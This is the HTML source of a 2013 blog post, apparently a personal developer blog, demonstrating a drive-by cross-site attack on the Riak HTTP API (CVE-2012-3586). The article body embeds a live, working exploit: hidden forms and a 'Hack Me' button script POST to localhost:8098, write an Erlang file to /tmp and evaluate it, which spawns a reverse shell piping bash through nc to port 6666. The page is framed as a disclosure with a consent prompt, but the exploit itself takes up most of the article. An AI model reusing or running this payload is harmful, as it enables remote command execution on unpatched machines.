@@ -1,0 +1,349 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Riak Drive by Attack - Ben's Blog</title>
+  <meta name="author" content="Ben Murphy">
+
+  
+  <meta name="description" content="Be careful with Riak HTTP API (CVE-2012-3586) This has been fixed in Riak 1.1.4 I would recommend not running the Riak HTTP API on a machine that you &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://benmmurphy.github.com/blog/2013/09/01/riak-drive-by-attack">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="/javascripts/ender.js"></script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <link href="/atom.xml" rel="alternate" title="Ben's Blog" type="application/atom+xml">
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+  <script type="text/javascript">
+    var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', 'UA-31750008-1']);
+    _gaq.push(['_trackPageview']);
+
+    (function() {
+      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    })();
+  </script>
+
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">Ben's Blog</a></h1>
+  
+    <h2>Developer Musings</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="http://google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:benmmurphy.github.com" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Riak Drive by Attack</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-09-01T21:29:00+01:00" pubdate data-updated="true">Sep 1<span>st</span>, 2013</time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><h2>Be careful with Riak HTTP API (CVE-2012-3586)</h2>
+
+<p>This has been fixed in <a href="http://lists.basho.com/pipermail/riak-users_lists.basho.com/2012-June/008635.html">Riak 1.1.4</a></p>
+
+<p>I would recommend not running the Riak HTTP API on a machine that you browse the internet on or on a machine that is reachable by machines that can browse the internet.</p>
+
+<p>This is heavily based on <a href="http://aphyr.com/posts/224-do-not-expose-riak-directly-to-the-internet">Aphyr’s work</a>. I’ve taken his work and used it in a cross site scripting attack. When you click the attack me button your riak process will attempt to connect to localhost:6666. If you run nc -l 6666 and wait for a connection you will have a shell with the privileges of the user running riak.</p>
+
+<p>The attack will perform the following actions</p>
+
+<ol>
+<li>Write the value <code>lols=lols</code> to the <code>key i_can_run_better</code> in bucket <code>everything_you_can_run</code></li>
+<li>Write the value <code>spawn(fun() -&gt; os:cmd("mkfifo /tmp/mypipe.$$ &amp;&amp; cat /tmp/mypipe.$$ | /bin/bash -i 2&gt;&amp;1 | nc localhost 6666 &gt; /tmp/mypipe.$$") end)</code> to the file <code>/tmp/evil.erl</code></li>
+<li>Evalute the contents of <code>/tmp/evil.erl</code> using the erlang function <code>file:path_eval</code>. This will cause your machine to try and open a connection to localhost:6666 that is backed by a shell running under the riak user.</li>
+</ol>
+
+
+<p>By clicking ‘Hack Me’ you agree that you have reviewed the source code of this page and understand what the attack will do and will not hold the author of this page liable for any damage the attack may cause.</p>
+
+<p>Click ‘Hack Me’ below to start the attack.</p>
+
+<iframe id='insert_record_frame' name='insert_record_frame' style='display:none;width:0px;height:0px'></iframe>
+
+
+
+
+<p><form action='http://localhost:8098/riak/everything_you_can_run/i_can_run_better' id='insert_record_form' method='POST' target='insert_record_frame'>
+  <input name='lols' type='hidden' value='lols' />
+</form></p>
+
+
+
+
+<iframe id='write_file' name='write_file' style='display:none;width:0px;height:0px'></iframe>
+
+
+
+
+<p><form action='http://localhost:8098/mapred' enctype='text/plain' id='write_file_form' method='POST' target='write_file'>
+  <input name='{"lolkey' type='hidden' value='":"bar","inputs":[["everything_you_can_run","i_can_run_better"]],"query":[{"map":{"language":"javascript","source":"function(v) {return [47,116,109,112,47,101,118,105,108,46,101,114,108];}"}},{"reduce":{"language":"erlang","module":"file","function":"write_file","arg":"spawn(fun() -&gt; os:cmd(\"mkfifo /tmp/mypipe.$$  &amp;&amp; cat /tmp/mypipe.$$ | /bin/bash -i 2&gt;&amp;1 | nc localhost 6666 &gt; /tmp/mypipe.$$\") end)."}}]}' />
+</form></p>
+
+
+
+
+<iframe id='evaluate_file' name='evaluate_file' style='display:none;width:0px;height:0px'></iframe>
+
+
+
+
+<p><form action='http://localhost:8098/mapred' enctype='text/plain' id='evaluate_file_form' method='POST' target='evaluate_file'>
+  <input name='{"lolkey' type='hidden' value='":"bar","inputs":[["everything_you_can_run", "i_can_run_better"]], "query":[{"map":{"language":"javascript", "source":"function(v) {return [47,116,109,112,47,101,118,105,108,46,101,114,108];}"}}, {"reduce":{"language":"erlang", "module":"file", "function":"path_eval", "arg":"/tmp/evil.erl"}}]}' />
+</form>
+<input id='hack_me' type='button' value='Hack Me' /></p>
+
+
+
+
+<script type='text/javascript'>
+  //<![CDATA[
+    $("#hack_me").click(function() {
+        if (confirm("You agree that you have reviewed the source code of this page and understand what the attack will do and will not hold the author of this page liable for any damage the attack may cause. ")) {
+            $("#insert_record_form")[0].submit();
+            setTimeout(write_file, 1000);
+        }
+    });
+    
+    function write_file() {
+        $("#write_file_form")[0].submit();
+        setTimeout(evaluate_file, 1000);           
+    }
+    
+    function evaluate_file() {
+        $("#evaluate_file_form")[0].submit();          
+    }
+  //]]>
+</script>
+
+
+
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">Ben Murphy</span></span>
+
+      
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-09-01T21:29:00+01:00" pubdate data-updated="true">Sep 1<span>st</span>, 2013</time>
+      
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://benmmurphy.github.com/blog/2013/09/01/riak-drive-by-attack/" data-via="benmmurphy" data-counturl="http://benmmurphy.github.com/blog/2013/09/01/riak-drive-by-attack/" >Tweet</a>
+  
+  
+  <div class="g-plusone" data-size="medium"></div>
+  
+  
+    <div class="fb-like" data-send="true" data-width="450" data-show-faces="false"></div>
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2012/05/15/abusing-dynamic-types-for-fun-and-profit/" title="Previous Post: Abusing Dynamic Types For Fun And Profit">&laquo; Abusing Dynamic Types For Fun And Profit</a>
+      
+      
+    </p>
+  </footer>
+</article>
+
+  <section>
+    <h1>Comments</h1>
+    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+  </section>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2013/09/01/riak-drive-by-attack/">Riak Drive by Attack</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2012/05/15/abusing-dynamic-types-for-fun-and-profit/">Abusing Dynamic Types For Fun And Profit</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+<section>
+  <h1>Latest Tweets</h1>
+  <ul id="tweets">
+    <li class="loading">Status updating...</li>
+  </ul>
+  <script type="text/javascript">
+    $.domReady(function(){
+      getTwitterFeed("benmmurphy", 4, false);
+    });
+  </script>
+  <script src="/javascripts/twitter.js" type="text/javascript"> </script>
+  
+    <a href="http://twitter.com/benmmurphy" class="twitter-follow-button" data-show-count="false">Follow @benmmurphy</a>
+  
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2013 - Ben Murphy -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+<script type="text/javascript">
+      var disqus_shortname = 'benmmurphy';
+      
+        
+        // var disqus_developer = 1;
+        var disqus_identifier = 'http://benmmurphy.github.com/blog/2013/09/01/riak-drive-by-attack/';
+        var disqus_url = 'http://benmmurphy.github.com/blog/2013/09/01/riak-drive-by-attack/';
+        var disqus_script = 'embed.js';
+      
+    (function () {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = 'http://' + disqus_shortname + '.disqus.com/' + disqus_script;
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+<div id="fb-root"></div>
+<script>(function(d, s, id) {
+  var js, fjs = d.getElementsByTagName(s)[0];
+  if (d.getElementById(id)) {return;}
+  js = d.createElement(s); js.id = id;
+  js.src = "//connect.facebook.net/en_US/all.js#appId=212934732101925&xfbml=1";
+  fjs.parentNode.insertBefore(js, fjs);
+}(document, 'script', 'facebook-jssdk'));</script>
+
+
+
+  <script type="text/javascript">
+    (function() {
+      var script = document.createElement('script'); script.type = 'text/javascript'; script.async = true;
+      script.src = 'https://apis.google.com/js/plusone.js';
+      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(script, s);
+    })();
+  </script>
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = 'http://platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
